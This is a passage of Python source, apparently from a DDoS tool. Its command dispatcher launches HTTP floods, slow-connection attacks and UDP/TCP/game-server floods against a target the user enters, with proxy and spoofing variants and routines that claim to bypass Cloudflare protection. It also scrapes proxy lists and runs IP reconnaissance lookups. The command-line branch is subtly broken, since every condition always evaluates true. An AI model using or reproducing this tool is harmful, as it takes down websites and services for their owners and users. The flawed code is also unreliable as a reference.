        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=AttackPXRAW, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'soc' in cmdl or 'SOC' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackSOC, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'pxsoc' in cmdl or 'PXSOC' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=AttackPXSOC, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'pxhulk' in cmdl or 'PXHULK' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        attackPXHULK(target, thread, t)
        timer.join()
    elif 'cfreq' in cmdl or 'CFREQ' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            threading.Thread(target=AttackCFPRO, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif 'cfsoc' in cmdl or 'CFSOC' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif 'http-god' in cmdl or 'HTTP-GOD' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackspoofv2, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'pxsky' in cmdl or 'PXSKY' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'sky' in cmdl or 'SKY' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'raw' in cmdl or 'RAW' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    #####################################################################################
    elif 'udp' in cmdl or 'UDP' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'tcp' in cmdl or 'TCP' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'mine' in cmdl or 'MINE' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runmine, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'vse' in cmdl or 'VSE' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runvse, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'httpddos' in cmdl or 'httpddos' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=Attackhttpddos, args=(target,thread, t)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        
        timer.join()   

    elif 'cfpro' in cmdl or 'CFPRO' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            threading.Thread(target=AttackCFPRO, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")    
    elif 'bypass' in cmdl or 'BYPASS' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackbypass, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'http2' in cmdl or 'HTTP2' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackhttp2, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'pxslow' in cmdl or 'PXSLOW' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=attackslow, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'stellar' in cmdl or 'STELLAR' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    
    ##################################################################################
    elif '.proxy' in cmdl or '.PROXY' in cmdl:
        try:
            qtime = int(input("Timeout proxy [seconds] (0 - all): "))
            if qtime == 0:
                qtime = None
        except:
            print(Fore.RED+"\nIncorrect timeout proxy\n")
            exit()
        req = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
        array = req.text.split()
        ip = requests.post("http://fsystem88.ru/ip").text #thank u fsystem))
        print(Back.GREEN+"Your ip: {}\n".format(ip)+Style.RESET_ALL)
        open("proxy.txt", "w+").close()
        for prox in array:
            thread_list = []
            t = threading.Thread (target=check, args=(ip, prox, qtime))
            thread_list.append(t)
            t.start()

    elif 'subnet' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif 'dns-lookup' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif 'reverse-dns' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif 'asn-lookup' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/ASN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/aslookup/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif 'reverseip' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/ASN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif 'dns' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif 'geoip' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif '.proxies' in cmdl:
      try:
          stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + ' PROXY STEALER STARTED...' + "\n")
          for site in proxy_resources:
              res = steal_proxies(site)
              if res:
                  stdout.write(Fore.MAGENTA + " [>] " + Fore.GREEN + " SUCCESSFUL " + Fore.WHITE + site + "\n")
              else:
                  stdout.write(Fore.MAGENTA + " [>] " + Fore.RED + ' UNSUCCESSFUL ' + Fore.WHITE + site + '\n')
      except Exception as Error:
          stdout.write(
                Fore.MAGENTA + " [>] " + Fore.MAGENTA + ".proxies command Error " + Fore.RED + f" [{Error}] " + '\n')   
    else:
        print((Colorate.Horizontal(Colors.red_to_purple, ' [!] Command not found.')))
    ######################################################################################


# If not launched in an input
if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clr()
        welcome()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write(
            "Method: attack, pxcfb, cfreq, cfsoc, pxsky, sky, get, post, head, soc, pxraw, pxsoc, http2, raw, pxhttp2, hulk, pxhulk, pxslow \n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t = sys.argv[4].rstrip()
    if method == "attack" or "attack":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
        
    elif method == "pxcfb" or "PXCFB":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
            
    elif method == "get" or "GET":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post" or "POST":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head" or "HEAD":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw" or "PXRAW":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc" or "SOC":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "tcp" or "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif method == "pxsoc" or "PXSOC":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq" or "CFREQ":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "cfsoc" or "CFSOC":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "http2" or "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2" or "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "pxsky" or "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "http-god" or "HTTP-GOD":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackspoofv2, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "sky" or "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif method == "bypass" or "BYPASS":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchBYPASS(target, thread, t)
            timer.join()
    elif method == "pxspoof" or "PXSPOOF":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSPOOF(target, thread, t)
            timer.join()
    elif method == "spoof" or "SPOOF":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchSPOOF(target, thread, t)
            timer.join()
    elif method == "hulk" or "HULK":
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchHULK(target, thread, t)
            timer.join()  
    elif method == "http2" or "HTTP2":
        threading.Thread(target=attackHTTP2, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif method == "stellar" or "STELLAR":
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif method == "pxhttp2" or "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=AttackPXHTTP2, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()

    
         
    else:
        stdout.write(
            "No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky,  get, post, head, soc, pxraw, pxsoc\n")


